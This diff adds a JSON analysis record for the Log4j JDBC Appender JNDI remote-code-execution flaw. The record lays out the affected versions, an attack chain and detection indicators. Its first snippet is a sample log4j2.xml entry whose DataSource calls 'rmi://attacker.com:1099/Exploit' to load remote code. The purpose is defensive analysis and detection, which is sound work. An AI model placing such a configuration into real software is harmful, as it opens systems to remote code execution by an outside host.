@@ -1,0 +1,96 @@
+{
+  "package_info": {
+    "package_name": "log4j-core",
+    "package_manager": "Maven",
+    "package_versions": "2.0-beta7 up to and including 2.17.0 (excluding 2.3.2, 2.12.4, 2.17.1)",
+    "why_malicious": "The package is vulnerable to arbitrary code execution if an attacker can modify the logging configuration file to use a JDBC Appender referencing a JNDI URI, which can result in remote code execution. This is due to insufficient restrictions on JNDI data source names in the JDBC Appender prior to version 2.17.1."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "runtime (upon log event with malicious configuration)",
+        "file_location": "log4j2.xml (or other Log4j configuration file)",
+        "required_permissions": [
+          "filesystem (write access to config)",
+          "network (for JNDI lookup)"
+        ]
+      },
+      "code_snippet": "<JDBC name=\"databaseAppender\" tableName=\"logs\">\n  <DataSource jndiName=\"rmi://attacker.com:1099/Exploit\" />\n  ...\n</JDBC>",
+      "code_language": "xml (Log4j configuration)",
+      "code_behavior": "At runtime, the code configures a JDBC Appender with a DataSource referencing a remote JNDI URI, causing Log4j to perform a JNDI lookup and potentially execute attacker-controlled code.",
+      "malice_analysis": {
+        "why_suspicious": "This configuration allows untrusted remote code to be loaded and executed via JNDI, which is a classic vector for code execution attacks.",
+        "violated_expectations": "Normal Log4j configurations should not allow arbitrary remote code execution via logging configuration. The use of remote JNDI URIs in logging configuration is highly unusual and dangerous.",
+        "similar_legitimate_use": "JNDI is sometimes legitimately used for internal resource lookups, but not for referencing untrusted remote servers.",
+        "key_indicators": [
+          "JDBC Appender with DataSource referencing a non-java JNDI URI",
+          "Presence of rmi://, ldap://, or other remote protocols in jndiName"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "runtime (JNDI lookup triggered by log event)",
+        "file_location": "JndiManager.java (core Log4j source code)",
+        "required_permissions": [
+          "network"
+        ]
+      },
+      "code_snippet": "return isJndiContextSelectorEnabled() || isJndiJdbcEnabled() || isJndiJmsEnabled() || isJndiLookupEnabled();",
+      "code_language": "java",
+      "code_behavior": "At runtime, this code determines if JNDI features are enabled, including JDBC, JMS, Lookup, and ContextSelector, which controls whether JNDI lookups (and thus potential code execution) are permitted.",
+      "malice_analysis": {
+        "why_suspicious": "The lack of fine-grained control over JNDI features prior to the fix allowed broader attack surface for JNDI-based code execution.",
+        "violated_expectations": "Normal expectation is that JNDI features should be tightly controlled and not enabled by default for all contexts.",
+        "similar_legitimate_use": "JNDI is used for legitimate resource lookups, but should not be enabled for untrusted sources.",
+        "key_indicators": [
+          "JNDI feature flags not granular",
+          "JNDI enabled for JDBC Appender without protocol restriction"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker gains write access to the Log4j configuration file.",
+      "implemented_by": [],
+      "leads_to": "Ability to inject malicious configuration."
+    },
+    {
+      "step": 2,
+      "action": "Attacker modifies the configuration to add a JDBC Appender with a DataSource referencing a remote JNDI URI.",
+      "implemented_by": [
+        "snippet_1"
+      ],
+      "leads_to": "Log4j will perform a JNDI lookup to the attacker's server."
+    },
+    {
+      "step": 3,
+      "action": "Log4j, upon processing a log event, triggers the JNDI lookup as configured.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Remote code or object is loaded and executed, resulting in arbitrary code execution."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "JDBC Appender in Log4j configuration referencing remote JNDI URIs",
+      "JNDI lookups triggered by log events",
+      "Unusual network activity from application process to external JNDI endpoints"
+    ],
+    "file_indicators": [
+      "log4j2.xml or log4j2.properties containing <DataSource jndiName=\"rmi://...\"> or similar",
+      "Configuration files with non-java JNDI protocols (rmi, ldap, etc.)"
+    ],
+    "network_indicators": [
+      "Outbound connections to rmi://, ldap://, or other JNDI protocols from application servers",
+      "Unexpected DNS lookups or connections to attacker-controlled domains"
+    ],
+    "how_to_detect": "Monitor Log4j configuration files for JDBC Appenders referencing remote JNDI URIs, especially those using rmi://, ldap://, or other non-java protocols. Alert on application processes making outbound JNDI-related network connections. Use static analysis to flag suspicious JNDI usage in configuration and code. Ensure only the 'java' protocol is permitted for JNDI in Log4j configurations."
+  }
+}
